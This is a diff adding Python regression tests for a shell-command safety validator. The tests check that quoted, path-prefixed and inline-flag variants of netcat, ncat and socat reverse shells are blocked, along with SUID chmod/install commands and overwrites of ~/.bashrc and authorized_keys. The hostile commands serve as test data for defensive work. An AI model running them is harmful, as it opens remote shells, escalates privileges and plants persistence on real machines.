@@ -653,3 +653,155 @@ class TestP0LogTampering:
         """Reading logs should be allowed."""
         result = validate_command("cat /var/log/syslog", config_path=safety_rules_path)
         assert result.allowed
+
+
+class TestQuotedCommandBypass:
+    """Regression tests for quoted command name bypass prevention.
+
+    Bashlex correctly parses "nc" as command name 'nc' (stripping quotes),
+    but regex patterns like \\bnc\\s+ won't match '"nc" -e' because of the quotes.
+    AST-based detection is required to catch these.
+
+    See: FINDING-001 from security review (2025-12)
+    """
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Direct netcat backdoors (should all be BLOCKED)
+            ("nc -e /bin/bash 10.0.0.1 4444", "Direct nc backdoor"),
+            ('"nc" -e /bin/bash 10.0.0.1 4444', "Double-quoted nc backdoor"),
+            ("'nc' -e /bin/bash 10.0.0.1 4444", "Single-quoted nc backdoor"),
+            ("/bin/nc -e /bin/bash 10.0.0.1 4444", "Path-prefixed nc backdoor"),
+            ("ncat --exec /bin/bash 10.0.0.1 4444", "Direct ncat exec"),
+            ('"ncat" --exec /bin/bash 10.0.0.1 4444', "Quoted ncat exec"),
+            ("socat TCP:10.0.0.1:4444 EXEC:/bin/bash", "Direct socat exec"),
+            ('"socat" TCP:10.0.0.1:4444 EXEC:/bin/bash', "Quoted socat exec"),
+            ("netcat -e /bin/bash 10.0.0.1 4444", "Direct netcat backdoor"),
+            ('"netcat" -e /bin/bash 10.0.0.1 4444', "Quoted netcat backdoor"),
+            # Other flag variants
+            ("nc -c /bin/sh 10.0.0.1 4444", "nc -c flag"),
+            ('"nc" -c /bin/sh 10.0.0.1 4444', "Quoted nc -c flag"),
+            ('ncat --sh-exec "/bin/bash" 10.0.0.1', "ncat --sh-exec"),
+            ("socat TCP:1.2.3.4:4444 SYSTEM:id", "socat SYSTEM:"),
+        ],
+    )
+    def test_quoted_backdoor_commands_blocked(self, safety_rules_path, command, description):
+        """Quoted command names MUST still be blocked.
+
+        This is a critical security regression test. Attackers can bypass
+        regex-based detection by quoting the command name.
+        """
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"CRITICAL: {description} should be BLOCKED, got {result.risk_level}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Safe commands with 'nc' as substring (should NOT be blocked)
+            ('grep -r "async def" tests/', "async contains nc - should be SAFE"),
+            ('grep -r "sync function" src/', "sync contains nc - should be SAFE"),
+            ('grep -r "panic error" logs/', "panic contains nc - should be SAFE"),
+            ('grep -r "func main" *.go', "func contains nc - should be SAFE"),
+            ('echo "async await pattern"', "Echo with async"),
+            # Safe nc usage (listen mode without exec, HIGH not BLOCKED)
+            ("nc -l -p 8080", "nc listen mode (HIGH, not BLOCKED)"),
+            # Just echoing dangerous text (not executing)
+            ('echo "nc -e /bin/bash"', "Echoing nc command (just text)"),
+            ('echo "Use socat EXEC for testing"', "Echoing socat in docs"),
+        ],
+    )
+    def test_quoted_bypass_no_false_positives(self, safety_rules_path, command, description):
+        """Ensure fix doesn't introduce false positives."""
+        result = validate_command(command, config_path=safety_rules_path)
+        # Should not be BLOCKED (can be SAFE, LOW, MEDIUM, or HIGH)
+        assert result.risk_level != RiskLevel.BLOCKED, (
+            f"False positive: {description} got BLOCKED, should be allowed. Command: {command}"
+        )
+
+
+class TestSecurityHardeningPatterns:
+    """Tests for security hardening patterns added in PR #45.
+
+    Covers:
+    - SUID/SGID detection (leading-zero octal, install -m)
+    - Inline flag syntax (--exec=)
+    - Dotfile persistence (overwrite detection)
+    - AST assignment/redirect filtering
+    """
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Leading-zero octal SUID
+            ("chmod 04755 /tmp/shell", "Leading-zero SUID (04755)"),
+            ("chmod 02755 /tmp/shell", "Leading-zero SGID (02755)"),
+            ("chmod 06755 /tmp/shell", "Leading-zero SUID+SGID (06755)"),
+            ("chmod 07755 /tmp/shell", "Leading-zero sticky+SUID+SGID (07755)"),
+            # Install command with SUID mode
+            ("install -m 4755 binary /usr/bin/", "install -m 4755"),
+            ("install -m 04755 binary /usr/bin/", "install -m 04755"),
+            ("install -m 2755 binary /usr/bin/", "install -m 2755 (SGID)"),
+            ("install -o root -m 4755 shell /usr/bin/", "install with owner and SUID"),
+        ],
+    )
+    def test_suid_patterns_blocked(self, safety_rules_path, command, description):
+        """Test SUID/SGID patterns are properly detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Inline flag syntax
+            ("ncat --exec=/bin/bash host 4444", "ncat --exec="),
+            ("ncat --sh-exec=/bin/sh host 4444", "ncat --sh-exec="),
+            # Separated syntax (existing coverage, sanity check)
+            ("ncat --exec /bin/bash host 4444", "ncat --exec separated"),
+        ],
+    )
+    def test_inline_flag_syntax_blocked(self, safety_rules_path, command, description):
+        """Test inline flag syntax (--flag=value) is detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # RC file overwrite
+            ("echo evil > ~/.bashrc", "Overwrite ~/.bashrc"),
+            ("echo evil > ~/.zshrc", "Overwrite ~/.zshrc"),
+            ("cat payload > ~/.profile", "Overwrite ~/.profile"),
+            # SSH authorized_keys overwrite
+            ("echo key > ~/.ssh/authorized_keys", "Overwrite authorized_keys"),
+            # Append (existing coverage, sanity check)
+            ("echo evil >> ~/.bashrc", "Append to ~/.bashrc"),
+        ],
+    )
+    def test_dotfile_overwrite_detected(self, safety_rules_path, command, description):
+        """Test dotfile overwrite patterns are detected."""
+        result = validate_command(command, config_path=safety_rules_path)
+        # Should be at least HIGH risk (HIGH is allowed=True with warning, BLOCKED is allowed=False)
+        assert result.risk_level in (RiskLevel.HIGH, RiskLevel.BLOCKED), (
+            f"Expected HIGH or BLOCKED for {description}, got {result.risk_level}"
+        )
+        assert "dotfile_persistence" in result.matched_rules, f"Expected dotfile_persistence rule to match for {description}"
+
+    @pytest.mark.parametrize(
+        "command,description",
+        [
+            # Assignment prefix should not confuse AST parsing
+            ("VAR=val nc -e /bin/bash host 4444", "VAR= prefix with nc -e"),
+            ("FOO=bar BAZ=qux nc -e /bin/sh host 4444", "Multiple assignments with nc -e"),
+            # Redirect should not confuse AST parsing
+            ("nc -e /bin/bash host 4444 2>&1", "nc -e with redirect suffix"),
+        ],
+    )
+    def test_ast_filtering_with_prefixes(self, safety_rules_path, command, description):
+        """Test AST correctly filters assignments and redirects."""
+        result = validate_command(command, config_path=safety_rules_path)
+        assert not result.allowed, f"Should be blocked: {description}"
+        assert result.risk_level == RiskLevel.BLOCKED, f"Expected BLOCKED for {description}"
